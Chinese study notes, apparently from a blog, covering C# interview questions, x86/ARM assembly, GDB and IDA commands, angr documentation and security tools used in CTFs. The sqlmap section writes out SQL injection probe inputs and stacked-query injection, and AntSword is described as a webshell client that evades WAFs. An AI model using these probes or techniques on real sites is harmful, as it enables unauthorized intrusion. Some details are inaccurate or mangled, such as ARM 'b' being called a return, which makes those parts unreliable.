是典型的平行关系，没有说谁在上谁在下的关系，模型负责业务领域的事情，视图负责显示的事情，控制器把数据读取出来填充模型后把模型交给视图去处理。而各种验证什么的应该是在模型里处理了。它强制性的使应用程序的输入、处理和输出分开。 MVC 最大的好处是将逻辑和页面分离。 46. 能用 foreach 遍历访问的对象的要求需要实现 IEnumerable 接口或声明 GetEnumerator 方法的类型。\n什么是反射?程序集包含模块，而模块又包括类型，类型下有成员，反射就是管理程序集，模块，类型的对象，它能够动态的创建类型的实例，设置现有对象的类型或者获取现有对象的类型，能调用类型的方法和访问类型的字段属性。它是在运行时创建和使用类型实例。\nORM中的延迟加载与直接加载有什么异同？延迟加载（ Lazy Loading ）只在真正需要进行数据操作的时候再进行加载数据，可以减少不必要的开销。\n简述Func与Action的区别？Func 是有返回值的委托， Action 是没有返回值的委托。\nref: https://blog.csdn.net/bt5190/article/details/118144811\nx86_64 asmIntel x86 CPU部分寄存器介绍\nEAX：一般用作累加器，函数的返回值EBX：一般用作基址寄存器（Base）ECX：一般用来计数（Count）EDX：一般用来存放数据（Data）ESP：一般用作堆栈栈定指针（Stack Pointer）EBP：一般用作堆栈栈底指针（Base Pointer）ESI：一般用作源变址（Source Index）EDI：一般用作目标变址（Destinatin Index）EIP : 记录即将执行下一条指令的地址\nIntel x64 CPU部分寄存器介绍\nRAX：一般用作累加器，函数的返回值RBX：一般用作基址寄存器（Base）RCX：一般用来计数（Count）RDX：一般用来存放数据（Data），函数调用的第三个参数RSP：一般用作堆栈指针（Stack Pointer）RBP：一般用作基址指针（Base Pointer）RSI：一般用作源变址（Source Index），函数调用的第二个参数RDI：一般用作目标变址（Destinatin Index），函数调用的第一个参数\nRIP : 记录即将执行下一条指令的地址\n部分Intel汇编指令介绍\nmov eax, 1   ; 给eax寄存器赋值1add eax, 3    ; 取出eax中的值加上3之后将结果保存至eaxsub eax, 4    ; 取出eax中的值减上4之后将结果保存至eaxpush eax      ; 将eax中的值压入堆栈中push 2          ; 将2压入堆栈中pop ecx        ; 将栈顶里的值弹给ecx寄存器call 0x1234  ; 等价于 push call指令的下一条指令地址，然后mov eip, 0x1234ret                ; 等价与 pop eipjmp 0x1234 ; 等价于 mov eip, 0x1234nop ; 空指令，等价于 add eip, 1\n函数调用约定32位程序函数调用: 一般从右至左依次将参数压入堆栈\nfunc(1, 2); // C  0x0 push 2  0x2 push 1   0x4 call func  0xa add esp, 8  func:    push ebp ; 环境保护    mov ebp, esp    sub esp, 0x10  ...  add esp, 0x10  pop ebp  ret (pop eip);\n\n64位程序函数调用: 从右至左依次传递参数，优先采用寄存器进行传参，当参数大于6个，后续参数采用堆栈进行传参. 寄存器顺序是:rdi,rsi,rdx, rcx, r8, r9\nfunc(1, 2); // C  0x00 mov rsi, 2  0x02 mov rdi, 1  0x04 call func; push 0x9; jmp func  0x09 nopfunc:  push rbp  mov rbp, rsp  sub rsp, 0x10  ...  leave  ; leave 相当于 mov rsp, rbp; pop rbp;  ret ; pop rip\n\n\n\nCall指令跳转地址计算方式call指令为E8\n比如:\n0x1234 E8 12 34 56 780x1239 c3\n\n这个机器码该怎么反编译：\ne8 为 call\nc3 为 ret\n12 34 56 78小端存储还原值为 0x78563412\n则跳转的地址为：\ntarget - next_addr &#x3D; 0x78563412\ntarget &#x3D; 0x1239 + 0x78563412 &#x3D; 0x78564651\n反编译为：\ncall 0x78564651ret\n\n\n\nArmv7 asm寄存器r0\nr1\nr2\nr3\nr4\nr5\nr6\nr7\nr8\nr9\nr10\nr11\nr12\nsp\npc\n指令bl 相当于x86 call\nb 相当于x86 return\nadd\nsub\nldr\nmov\nbeq\ncmp\nbne\nstr\nSTR{条件} 源寄存器，&lt;存储器地址&gt;\nSTR指令用亍从源寄存器中将一个32位的字数据传送到存储器中。该指令在程序设计中比较常\n用，寻址方式灵活多样，使用方式可参考指令LDR。\n指令示例：\nSTR R0，[R1]，＃8 ；将R0中的字数据写入以R1为地址的存储器中，并将新地址R1＋8写入R1。\nSTR R0，[R1，＃8] ；将R0中的字数据写入以R1＋8为地址的存储器中。”\nstr r1, [r0] ；将r1寄存器的值，传送到地址值为r0的（存储器）内存中\n堆栈结构当一个函数调用使用少量参数(ARM上是少于等于4个)时，参数是通过寄存器进行传值(ARM上是通过r0,r1,r2,r3)，而当参数多于4个时，会将多出的参数压入栈中进行传递(其实在函数调用过程中也会把r0,r1,r2,r3传递的参数压入栈)\n工具GDB部分gdb调试命令\nsi    ;单步调试，遇到call指令，跟踪进入b *0x1234  ; 在0x1234地址处下断点i b   ; 查看所有断点i r ; 查看寄存器\np $eax ; 查看eax寄存器的值lay  asm   ; 打开汇编界面c    ; 一直运行，直到遇到断点停下start   ; 默认在程序入口下段点，在程序入口停下run     ; 每输入一次，重新运行程序x &#x2F;40wx $eax        ; 查看eax寄存器指向的内存中的内容x &#x2F;20gx 0x1234         ; 查看内存地址0x1234中的内容q 退出gdbfinish 结束该函数\n部分gdb pwndbg插件命令\nvmmap  ; 查看内存页布局stack ; 查看堆栈内容heap ; 查看堆的chunk布局bin ; 查看堆中的binparseheap ; 解析堆布局\nIDA常用快捷键a：将数据转换为字符串\nf5：一键反编译\nshift+f12：可以打开string窗口\nctrl+s：选择某个数据段，直接进行跳转\nx：对着某个函数、变量按该快捷键，可以查看它的交叉引用\nn：更改变量的名称\ny：更改变量的类型\ng：直接跳转到某个地址\nctrl+shift+w：拍摄IDA快照\nu：undefine，取消定义函数、代码、数据的定义\nb：按下B键转换为二进制也是同理。\nc: 将数据段转化成代码\nh：在数字上按下H键或者右键进行选择，可以将数字转化为十进制：\nGhidraGhidra是一个软件逆向工程（SRE）框架，包括一套功能齐全的高端软件分析工具，使用户能够在各种平台上分析编译后的代码，包括Windows、Mac OS和Linux。功能包括反汇编，汇编，反编译，绘图和脚本，以及数百个其他功能。Ghidra支持各种处理器指令集和可执行格式，可以在用户交互模式和自动模式下运行。用户还可以使用公开的API开发自己的Ghidra插件和脚本。\nAntsword中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。在CTF中，主要用于连接web shell，且使用了编&#x2F;解码器进行流量混淆可绕过WAF，并且有多款实用插件。\ngithub: https://github.com/AntSwordProject/antSword\nArachniArachni是一个能够满足很多使用场景的通用的安全扫描框架，范围覆盖非常广，既包括小到一个命令行指令的扫描，又包括高性能的网格扫描、脚本认证审计、多用户多web合作平台。此外，它简单的REST API使集成变得轻而易举。\nSqlmapsqlmap是一个开源，跨平台的自动化SQL注入工具，目前支持大多数主流数据库有MySQL，Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite等\n特性：\n\nsqlmap是一款开源免费的漏洞检查、利用工具.\n可以检测页面中get,post参数,cookie,http头等.\n可以实现数据榨取\n可以实现文件系统的访问\n可以实现操作命令的执行\n还可以对xss漏洞进行检测\n基于布尔的盲注检测 (如果一个url的地址为xxxx.php?id&#x3D;1,那么我们可以尝试下的加上 and 1&#x3D;1(和没加and1&#x3D;1结果保持一致) 和 and 1&#x3D;2(和不加and1&#x3D;2结果不一致),则我们基本可以确定是存在布尔注入的. )\n基于时间的盲注检测(和基于布尔的检测有些类似.通过mysql的 sleep(int)) 来观察浏览器的响应是否等待了你设定的那个值 如果等待了,则表示执行了sleep,则基本确定是存在sql注入的\n基于错误的检测 (组合查询语句,看是否报错(在服务器没有抑制报错信息的前提下),如果报错 则证明我们组合的查询语句特定的字符被应用了,如果不报错,则我们输入的特殊字符很可能被服务器给过滤掉(也可能是抑制了错误输出.))\n基于union联合查询的检测(适用于如果某个web项目对查询结果只展示一条而我们需要多条的时候 则使用union联合查询搭配concat还进行获取更多的信息)\n基于堆叠查询的检测(首先看服务器支不支持多语句查询,一般服务器sql语句都是写死的,某些特定的地方用占位符来接受用户输入的变量,这样即使我们加and 也只能执行select(也不一定select,主要看应用场景,总之就是服务端写了什么,你就能执行什么)查询语句,如果能插入分号;则我们后面可以自己组合update,insert,delete等语句来进行进一步操作)\n\nref:\nhttp://t.zoukankan.com/php09-p-10404560.html\nhttps://blog.csdn.net/talentac/article/details/123050653\nXraygithub: https://github.com/chaitin/xray\nxray 是一款功能强大的安全评估工具，由多名经验丰富的一线安全从业者呕心打造而成，主要特性有:\n\n检测速度快。发包速度快; 漏洞检测算法高效。\n支持范围广。大至 OWASP Top 10 通用漏洞检测，小至各种 CMS 框架 POC，均可以支持。\n代码质量高。编写代码的人员素质高, 通过 Code Review、单元测试、集成测试等多层验证来提高代码可靠性。\n高级可定制。通过配置文件暴露了引擎的各种参数，通过修改配置文件可以极大的客制化功能。\n安全无威胁。xray 定位为一款安全辅助评估工具，而不是攻击工具，内置的所有 payload 和 poc 均为无害化检查。\n\n目前支持的漏洞检测类型包括:\n\nXSS漏洞检测 (key: xss)\nSQL 注入检测 (key: sqldet)\n命令&#x2F;代码注入检测 (key: cmd-injection)\n目录枚举 (key: dirscan)\n路径穿越检测 (key: path-traversal)\nXML 实体注入检测 (key: xxe)\n文件上传检测 (key: upload)\n弱口令检测 (key: brute-force)\njsonp 检测 (key: jsonp)\nssrf 检测 (key: ssrf)\n基线检查 (key: baseline)\n任意跳转检测 (key: redirect)\nCRLF 注入 (key: crlf-injection)\nStruts2 系列漏洞检测 (高级版，key: struts)\nThinkphp系列漏洞检测 (高级版，key: thinkphp)\nPOC 框架 (key: phantasm)\n\n其中 POC 框架默认内置 Github 上贡献的 poc，用户也可以根据需要自行构建 poc 并运行。\nAngrangr是一个基于python的框架支持多处理器架构的二进制分析工具包，它具有对二进制程序动态符号化执行以及多种静态分析的能力。官网，安装也非常简单，直接docker拉取或者pip install angr就能一键安装。\n装载机&gt;&gt;&gt; import angr, monkeyhex&gt;&gt;&gt; proj = angr.Project(&#x27;/bin/true&#x27;)&gt;&gt;&gt; proj.loader\n\n加载的对象\nCLE loader（cle.Loader）表示整个加载的二进制对象集合，加载并映射到单个内存空间。每个二进制对象都由一个可以处理其文件类型（cle.Backend）的加载器后端加载。例如，cle.ELF用于加载ELF二进制文件。\n内存中的对象也不会与任何加载的二进制文件相对应。例如，用于提供线程本地存储支持的对象，以及用于提供未解析符号的externs对象。\n您可以获得CLE已加载的对象的完整列表loader.all_objects，以及几个更有针对性的分类：\n# All loaded objects&gt;&gt;&gt; proj.loader.all_objects[&lt;ELF Object fauxware, maps [0x400000:0x60105f]&gt;, &lt;ELF Object libc.so.6, maps [0x1000000:0x13c42bf]&gt;, &lt;ELF Object ld-linux-x86-64.so.2, maps [0x2000000:0x22241c7]&gt;, &lt;ELFTLSObject Object cle##tls, maps [0x3000000:0x300d010]&gt;, &lt;KernelObject Object cle##kernel, maps [0x4000000:0x4008000]&gt;, &lt;ExternObject Object cle##externs, maps [0x5000000:0x5008000]&gt;# This is the &quot;main&quot; object, the one that you directly specified when loading the project&gt;&gt;&gt; proj.loader.main_object&lt;ELF Object true, maps [0x400000:0x60105f]&gt;# This is a dictionary mapping from shared object name to object&gt;&gt;&gt; proj.loader.shared_objects&#123; &#x27;libc.so.6&#x27;: &lt;ELF Object libc.so.6, maps [0x1000000:0x13c42bf]&gt;  &#x27;ld-linux-x86-64.so.2&#x27;: &lt;ELF Object ld-linux-x86-64.so.2, maps [0x2000000:0x22241c7]&gt;&#125; # Here&#x27;s all the objects that were loaded from ELF files# If this were a windows program we&#x27;d use all_pe_objects!&gt;&gt;&gt; proj.loader.all_elf_objects[&lt;ELF Object true, maps [0x400000:0x60105f]&gt;, &lt;ELF Object libc.so.6, maps [0x1000000:0x13c42bf]&gt;, &lt;ELF Object ld-linux-x86-64.so.2, maps [0x2000000:0x22241c7]&gt;]# Here&#x27;s the &quot;externs object&quot;, which we use to provide addresses for unresolved imports and angr internals&gt;&gt;&gt; proj.loader.extern_object&lt;ExternObject Object cle##externs, maps [0x5000000:0x5008000]&gt;# This object is used to provide addresses for emulated syscalls&gt;&gt;&gt; proj.loader.kernel_object&lt;KernelObject Object cle##kernel, maps [0x4000000:0x4008000]&gt;# Finally, you can to get a reference to an object given an address in it&gt;&gt;&gt; proj.loader.find_object_containing(0x400000)&lt;ELF Object true, maps [0x400000:0x60105f]&gt;\n\n　您可以直接与这些对象进行交互以从中提取元数据：\n&gt;&gt;&gt; obj = proj.loader.main_object# The entry point of the object&gt;&gt;&gt; obj.entry0x400580&gt;&gt;&gt; obj.min_addr, obj.max_addr(0x400000, 0x60105f)# Retrieve this ELF&#x27;s segments and sections&gt;&gt;&gt; obj.segments&lt;Regions: [&lt;ELFSegment offset=0x0, flags=0x5, filesize=0xa74, vaddr=0x400000, memsize=0xa74&gt;,           &lt;ELFSegment offset=0xe28, flags=0x6, filesize=0x228, vaddr=0x600e28, memsize=0x238&gt;]&gt;&gt;&gt;&gt; obj.sections&lt;Regions: [&lt;Unnamed | offset 0x0, vaddr 0x0, size 0x0&gt;,           &lt;.interp | offset 0x238, vaddr 0x400238, size 0x1c&gt;,           &lt;.note.ABI-tag | offset 0x254, vaddr 0x400254, size 0x20&gt;,            ...etc            # You can get an individual segment or section by an address it contains:&gt;&gt;&gt; obj.find_segment_containing(obj.entry)&lt;ELFSegment offset=0x0, flags=0x5, filesize=0xa74, vaddr=0x400000, memsize=0xa74&gt;&gt;&gt;&gt; obj.find_section_containing(obj.entry)&lt;.text | offset 0x580, vaddr 0x400580, size 0x338&gt;# Get the address of the PLT stub for a symbol&gt;&gt;&gt; addr = obj.plt[&#x27;abort&#x27;]&gt;&gt;&gt; addr0x400540&gt;&gt;&gt; obj.reverse_plt[addr]&#x27;abort&#x27;# Show the prelinked base of the object and the location it was actually mapped into memory by CLE&gt;&gt;&gt; obj.linked_base0x400000&gt;&gt;&gt; obj.mapped_base37 0x400000\n\n符号和重新定位还可以在使用CLE时使用符号。符号是可执行格式世界中的基本概念，有效地将名称映射到地址。\n从CLE获取符号的最简单方法是使用loader.find_symbol，它接受名称或地址并返回Symbol对象。\n&gt;&gt;&gt; malloc = proj.loader.find_symbol(&#x27;malloc&#x27;)&gt;&gt;&gt; malloc&lt;Symbol &quot;malloc&quot; in libc.so.6 at 0x1054400&gt;\n\n符号上最有用的属性是其名称，所有者和地址，但符号的“地址”可能不明确。Symbol对象有三种报告其地址的方式：\n\n.rebased_addr是它在所有地址空间中的地址。这是打印输出中显示的内容。\n.linked_addr是它相对于二进制的预链接基础的地址。\n.relative_addr是它相对于对象库的地址。这在文献（特别是Windows文献）中称为RVA（相对虚拟地址）。\n\n&gt;&gt;&gt; malloc.name&#x27;malloc&#x27;&gt;&gt;&gt; malloc.owner_obj&lt;ELF Object libc.so.6, maps [0x1000000:0x13c42bf]&gt;&gt;&gt;&gt; malloc.rebased_addr0x1054400&gt;&gt;&gt; malloc.linked_addr0x54400&gt;&gt;&gt; malloc.relative_addr0x54400\n\n除了提供调试信息之外，符号还支持动态链接的概念。libc提供函数符号作为导出，主二进制文件依赖于它。如果我们要求CLE直接从主对象给我们一个函数符号，它会告诉我们这是一个导入符号。导入符号没有与之关联的有意义的地址，但它们确实提供了用于解析它们的符号的引用，如.resolvedby。\n&gt;&gt;&gt; malloc.is_exportTrue&gt;&gt;&gt; malloc.is_importFalse# On Loader, the method is find_symbol because it performs a search operation to find the symbol.# On an individual object, the method is get_symbol because there can only be one symbol with a given name.&gt;&gt;&gt; main_malloc = proj.loader.main_object.get_symbol(&quot;malloc&quot;)&gt;&gt;&gt; main_malloc&lt;Symbol &quot;malloc&quot; in true (import)&gt;&gt;&gt;&gt; main_malloc.is_exportFalse&gt;&gt;&gt; main_malloc.is_importTrue&gt;&gt;&gt; main_malloc.resolvedby&lt;Symbol &quot;malloc&quot; in libc.so.6 at 0x1054400&gt;\n\n导入和导出之间的链接在内存中注册的具体方式由另一个名为relocations的概念处理。重定位也就是“当您使用导出符号匹配*[import]时，请将导出地址写入[location]，格式为[format]*。” 我们可以看到对象（作为Relocation实例）的完整重定位列表obj.relocs，或者把符号名称到Relocation as的映射作为obj.imports。没有相应的导出符号列表。\n可以访问重定位的相应导入符号.symbol。重定位将写入的地址，可用于Symbol的任何地址标识符访问，并且您也可以获取对请求重定位的对象的引用.owner_obj。\n# Relocations don&#x27;t have a good pretty-printing, so those addresses are python-internal, unrelated to our program&gt;&gt;&gt; proj.loader.shared_objects[&#x27;libc.so.6&#x27;].imports&#123;u&#x27;__libc_enable_secure&#x27;: &lt;cle.backends.relocations.generic.GenericJumpslotReloc at 0x4221fb0&gt;, u&#x27;__tls_get_addr&#x27;: &lt;cle.backends.relocations.generic.GenericJumpslotReloc at 0x425d150&gt;, u&#x27;_dl_argv&#x27;: &lt;cle.backends.relocations.generic.GenericJumpslotReloc at 0x4254d90&gt;, u&#x27;_dl_find_dso_for_object&#x27;: &lt;cle.backends.relocations.generic.GenericJumpslotReloc at 0x425d130&gt;, u&#x27;_dl_starting_up&#x27;: &lt;cle.backends.relocations.generic.GenericJumpslotReloc at 0x42548d0&gt;, u&#x27;_rtld_global&#x27;: &lt;cle.backends.relocations.generic.GenericJumpslotReloc at 0x4221e70&gt;, u&#x27;_rtld_global_ro&#x27;: &lt;cle.backends.relocations.generic.GenericJumpslotReloc at 0x4254210&gt;&#125;\n\n如果导入无法解析为任何导出，例如，因为找不到共享库，CLE将自动更新externs对象（loader.extern_obj）以声明它将符号作为导出。\n加载选项如果要加载某些内容angr.Project并且想要将选项传递给cle.LoaderProject隐式创建的实例，则只需将关键字参数直接传递给Project构造函数，它就会传递给CLE。如果您想知道可能作为选项传递的所有内容，但我们将在此处介绍一些重要且经常使用的选项。\nclass cle.loader.Loader（main_binary，auto_load_libs = True，force_load_libs =（），skip_libs =（），main_opts = None，lib_opts = None，custom_ld_path =（），use_system_libs = True，ignore_import_version_numbers = True，case_insensitive = False，rebase_granularity = 16777216，except_missing_libs = False，aslr = False，page_size = 1，extern_size = 32768 ）加载器加载所有对象并导出进程内存的抽象。你在这里看到的是一个带有加载和重新定位的二进制文件的地址空间。参数：\tmain_binary - 要加载的主二进制文件的路径，或者包含二进制文件的类文件对象。　　　　以下参数是可选的。参数：\t　　auto_load_libs - 是否自动加载加载对象所依赖的共享库。　　force_load_libs - 要加载的库列表，无论加载的对象是否需要它们。　　skip_libs - 永不加载的库列表，即使加载对象需要它们也是如此。　　main_opts - 加载主二进制文件的选项字典。　　lib_opts - 字典映射库名称到加载它们时要使用的选项的字典。　　custom_ld_path - 我们可以在其中搜索共享库的路径列表。　　use_system_libs - 是否搜索所请求库的系统加载路径。默认为True。　　ignore_import_version_numbers - 文件名中具有不同版本号的库是否会被视为等效，例如libc.so.6和libc.so.0　　case_insensitive - 如果将其设置为True，则无论基础文件系统的区分大小写如何，文件系统加载都将以区分大小写的方式完成。　　rebase_granularity - 用于重新定位共享对象的对齐方式　　except_missing_libs - 无法找到共享库时抛出异常。　　aslr - 在符号地址空间中加载库。不要使用此选项。　　page_size - 数据映射到内存的粒度。如果您在非分页环境中工作，请设置为1。变量：\t　　memory（cle.memory.Clemory） - 程序的加载，重新定位和重定位的内存。　　main_object - 表示主二进制文件的对象（即可执行文件）。　　shared_objects - 将加载的库名称映射到表示它们的对象的字典。　　all_objects - 包含加载的所有不同对象的表示的列表。　　requested_names - 包含由某人标记为依赖项的所有不同共享库的名称的集合。　　initial_load_objects - 由于初始加载请求而加载的所有对象的列表。\n\n基本选项我们已经讨论过auto_load_libs- 它启用或禁用CLE尝试自动解析共享库依赖项，默认情况下处于启用状态。此外，还有相反的情况，except_missing_libs如果设置为true，则只要二进制文件具有无法解析的共享库依赖项，就会引发异常。\n您可以传递一个字符串列表，force_load_libs列出的任何内容都将被视为一个未解析的共享库依赖项，或者您可以传递一个字符串列表skip_libs以防止该名称的任何库被解析为依赖项。此外，您可以custom_ld_path在任何默认值之前传递一个字符串列表（或单个字符串），它将用作共享库的附加搜索路径：与加载的程序相同的目录，当前工作目录和你的系统库。\n额外选项如果要指定仅适用于特定二进制对象的某些选项，CLE也会允许您这样做。参数main_ops和``lib_opts通过选择词典来完成。main_opts是从选项名称到选项值lib_opts的映射，同时是从库名称到字典映射选项名称到选项值的映射。\n您可以使用的选项从后端各不相同，但一些常见的选项是：\n\nbackend - 使用哪个后端，作为类或名称\ncustom_base_addr - 要使用的基地址\ncustom_entry_point - 使用的入口点\ncustom_arch - 要使用的体系结构的名称\n\n例如\nngr.Project(main_opts=&#123;&#x27;backend&#x27;: &#x27;ida&#x27;, &#x27;custom_arch&#x27;: &#x27;i386&#x27;&#125;, lib_opts=&#123;&#x27;libc.so.6&#x27;: &#123;&#x27;backend&#x27;: &#x27;elf&#x27;&#125;&#125;)\n\n后端CLE目前有后端静态加载ELF，PE，CGC，Mach-O和ELF核心转储文件，以及使用IDA加载二进制文件并将文件加载到平面地址空间。在大多数情况下，CLE会自动检测正确的后端，所以你不需要指定你正在使用哪个后端，除非你做了一些非常奇怪的事情。\n如上所述，您可以通过在其选项字典中包含一个键来强制CLE使用特定的后端作为对象。某些后端无法自动检测要使用的架构，并且必须具有custom_arch指定的架构。密钥不需要匹配任何体系结构列表; angr将确定您所指的架构的任何公共标识符。\n要引用后端，请使用此表中的名称：\n\n\n\nbackend name\ndescription\nrequires custom_arch?\n\n\n\nelf\n基于PyELFTools的ELF文件的静态加载程序\nno\n\n\npe\n基于PEFile的PE文件静态加载器\nno\n\n\nmach-o\nMach-O文件的静态加载程序。不支持动态链接或变基。\nno\n\n\ncgc\nCyber Grand Challenge二进制文件的静态加载程序\nno\n\n\nbackedcgc\nGC二进制文件的静态加载程序，允许指定内存和寄存器\nno\n\n\nelfcore\n用于ELF核心转储的静态加载程序\nno\n\n\nida\n启动IDA实例来解析文件\nyes\n\n\nblob\n将文件作为平面镜像加载到内存中\nyes\n\n\n符号函数摘要默认情况下，Project尝试使用称为SimProcedures的符号摘要替换对库函数的外部调用- 实际上只是模仿库函数对状态的影响的python函数。我们已经实现了一大堆 SimProcedures 功能。这些内置过程在angr.SIM_PROCEDURES字典中可用，它是两层的，首先在包名称（libc，posix，win32，stubs）上植入，然后在库函数的名称上植入。执行SimProcedure而不是从系统加载的实际库函数使得分析更容易处理，代价是一些潜在的不准确性。\n使用angr时遇到了问题此部分包含angr的用户/受害者经常遇到的陷阱列表。SimProcedure不准确    为了使符号执行更容易处理，angr用Python编写的摘要替换了常见的库函数。我们将这些摘要称为SimProcedures。SimProcedures允许我们减轻路径爆炸，否则将通过strlen在符号字符串上运行引入路径爆炸。不幸的是，我们的SimProcedures远非完美。如果angr显示意外行为，则可能是由错误/不完整的SimProcedure引起的。你可以做几件事：禁用SimProcedure（您可以通过将选项传递给angr.Project类来排除特定的SimProcedures）。这有可能导致路径爆炸的缺点，除非您非常小心地将输入约束到相关函数。使用其他angr功能（例如Veritesting）可以部分减轻路径爆炸。将SimProcedure替换为直接写入相关情况的内容。例如，我们的scanf实现并不完整，但是如果你只需要支持一个已知的格式字符串，你可以编写一个钩子来完成它。修复SimProcedure。不支持的系统调用系统调用也实现为SimProcedures。不幸的是，我们尚未在angr中实现系统调用。对于不受支持的系统调用，有几种解决方法：实施系统调用。TODO：记录这个过程挂钩系统调用的呼叫站点（使用project.hook）以临时方式对状态进行必要的修改。使用state.posix.queued_syscall_returns列表对syscall返回值进行排队。如果返回值排队，则不会执行系统调用，而是使用该值。此外，函数可以排队作为“返回值”，这将导致该函数应用于触发系统调用时的状态。符号记忆模型angr使用的默认记忆模型的灵感来自Mayhem。此内存模型支持有限的符号读取和写入。如果读取的内存索引是符号，并且此索引的可能值范围太宽，则索引将具体化为单个值。如果写入的内存索引完全是符号，则索引将具体化为单个值。这可以通过改变内存具体化策略来配置state.memory。符号长度SimProcedures，尤其是系统调用，例如read()，write()可能会遇到缓冲区长度符号化的情况。一般来说，处理得非常糟糕：在许多情况下，这个长度最终会在后来的执行步骤中被完全具体化或追溯性具体化。即使在不是这样的情况下，源文件或目标文件可能最终看起来有点“怪异”。\n\n如果没有针对给定函数的摘要：\n\n如果auto_load_libs是True（这是默认值），则执行真正的库函数。根据实际功能，这可能是您想要的，也可能不是。例如，某些libc的函数分析非常复杂，并且很可能会导致尝试执行它们的路径的状态数量激增。\n如果auto_load_libs是False，则外部函数未解析，Project将其解析为通用的“存根”SimProcedure调用ReturnUnconstrained。它的名字就是这样：它每次调用时都会返回一个唯一的无约束符号值。\n如果use_sim_procedures（这是一个参数angr.Project，而不是cle.Loader）是False（True默认情况下），那么只有extern对象提供的符号将被SimProcedures替换，它们将被一个存根替换ReturnUnconstrained，它只会返回一个符号值。\n您可以指定要排除的特定符号，以使用以下参数替换为SimProcedures angr.Project：exclude_sim_procedures_list和exclude_sim_procedures_func。\n查看angr.Project._register_object确切算法的代码。\n\nHooking　　angr用python替换库代码的机制称为挂钩，你也可以这样做！在执行模拟时，每个步骤都会检查当前地址是否已挂钩，如果是，则运行挂钩而不是该地址处的二进制代码。该API，让你做到这一点是proj.hook(addr, hook)，这里hook是一个SimProcedure实例。您可以使用和管理项目的钩子.is_hooked，希望不需要解释。.unhook``.hooked_by\n有一个用于挂钩地址的备用API，通过使用proj.hook(addr)函数装饰器，您可以指定自己的函数作为钩子使用。如果执行此操作，还可以选择指定length关键字参数，以使执行在挂钩完成后向前跳转一些字节数。\n&gt;&gt;&gt; stub_func = angr.SIM_PROCEDURES[&#x27;stubs&#x27;][&#x27;ReturnUnconstrained&#x27;] # this is a CLASS&gt;&gt;&gt; proj.hook(0x10000, stub_func())  # hook with an instance of the class&gt;&gt;&gt; proj.is_hooked(0x10000)            # these functions should be pretty self-explanitoryTrue&gt;&gt;&gt; proj.unhook(0x10000)&gt;&gt;&gt; proj.hooked_by(0x10000)&lt;ReturnUnconstrained&gt;&gt;&gt;&gt; @proj.hook(0x20000, length=5)... def my_hook(state):...     state.regs.rax = 1&gt;&gt;&gt; proj.is_hooked(0x20000)True\n\n此外，您可以使用proj.hook_symbol(name, hook)符号名称作为第一个参数来挂钩符号所在的地址。一个非常重要的用法是扩展angr的内置库SimProcedures的行为。由于这些库函数只是类，因此可以对它们进行子类化，覆盖它们的行为，然后在钩子中使用子类。\n您还可以在使用CLE时使用符号。符号是可执行格式世界中的基本概念，有效地将名称映射到地址。\n从CLE获取符号的最简单方法是使用loader.find_symbol，它接受名称或地址并返回Symbol对象。\nCFG (控制流程图)angr提供2种方式访问CFG，CFGFast和CFGEmulated。\n\nCFGFast采用静态方式生成CFG，会受限于某些CFG只能运行时产生。\nCFGEmulated采用符号执行生成CFG。而可能由于符号执行路径不全的问题可能造成CFG一些缺失。\n\n\n\n首先计算CFGFast\n\n说明：angr中CFG()是CFGFast()的子类，也就是在CFGFast()基础上的一个包装。\n这里我们通过angr-utils将cfg绘画出来，看起来更直观：\n\n因此总结来说，angr计算CFG的过程就是：模拟执行每个基本块，并判断该基本块下一步会走向哪个基本块，从而建立cfg的边关系。然而存在一些困难：一个基本块在不同的上下文中会有不同的表现形式。举例来说，一个函数返回时的基本块（即上面的func()函数），对于不同的调用者而言该基本块的下一跳的地址是不一样的。因此上下文调用关系的保留情况对于CFG构建至关重要。angr中即是通过context_sensitivity_level参数来确定在调用栈中保留多少个函数\nref: http://t.zoukankan.com/0xHack-p-9400900.html\nref: https://blog.csdn.net/sp5627896/article/details/83067907\nAFLAFL-Fuzz介绍\nAFL(American Fuzzy Lop)是由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具。\n\n其可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。\n由于需要在相关代码处插桩，因此AFL主要用于对开源软件进行测试。\n配合QEMU等工具，也可对闭源二进制代码进行fuzzing，但执行效率会受到影响。\n\n工作原理：通过对源码进行重新编译时进行插桩（简称编译时插桩）的方式利用自动产生测试用例来探索二进制程序内部新的执行路径。另一种是直接对没有源码的二进制程序进行测试，但需要QEMU的支持。\n它的工作流程大致如下：\n\n将用户提供的初始测试用例加载到队列中\n从队列中获取下一个输入文件\n尝试将测试用例调整到不会影响程序行为的最小大小\n使用均衡的经过充分研究过的各种传统模糊测试策略反复的变异文件\n如果任何生成的突变导致记录了一个新的状态转换，将变异的输出作为新的加入到队列中\n回到步骤2开始重复操作发现的测试用例也会定期选出部分消除，用更新的更高覆盖率的用例所取代，并执行几个其他插桩驱动的工作量最小化步骤。\n\nAFL变异策略\n确定性变异\n\n\n比特翻转（bitflip）：按位翻转，1变为0，0变为1.这一阶段还会按照不同的长度和步长进行多种不同的翻转，每次翻转1&#x2F;2&#x2F;4&#x2F;8&#x2F;16&#x2F;32 bit，依次进行。\n算术运算(arithmetic)：整数加&#x2F;减算术运算。跟bitflip类似，arithmetic根据目标大小的不同，也分为了多个子阶段，依次对8&#x2F;16&#x2F;32 bit进行加减运算。\n特殊值替换（interest）：把一些特殊内容替换到原文件中。同样每次对8&#x2F;16&#x2F;32 bit进行替换。所谓的特殊内容是AFL预设的一些比较特殊的数，比如可能造成溢出的数。\n字典值（dictionary）：把自动生成或用户提供的字典值替换或插入到原测试用例中。\n\n\n随机变异\n\n\nhavoc大破坏：对文件进行大量破坏，此阶段会对原文件进行大量随机变异。包括随机翻转、加减、替换和删除等操作。\n文件拼接splice：此阶段会将两个文件拼接起来得到一个新的文件，并对这个新文件继续执行havoc变异。\n\n\n\nref: https://zhuanlan.zhihu.com/p/524552737\nref: https://baijiahao.baidu.com/s?id=1660936764080017733&amp;wfr=spider&amp;for=pc\nGithub项目Pwn Wafctf awd 流量抓取工具\nhttps://github.com/I0gan/pwn_waf\n该WAF拥有四种模式，流量抓取模式，通防模式，单目标流量转发模式，多目标流量转发模式，代码轻巧简单，可以根据自己需求二次开发，waf配置简单，没有依赖，日志格式清晰明了，拥有16进制字符串payload，更方便编写反打EXP。\nAwd Script ctf awd 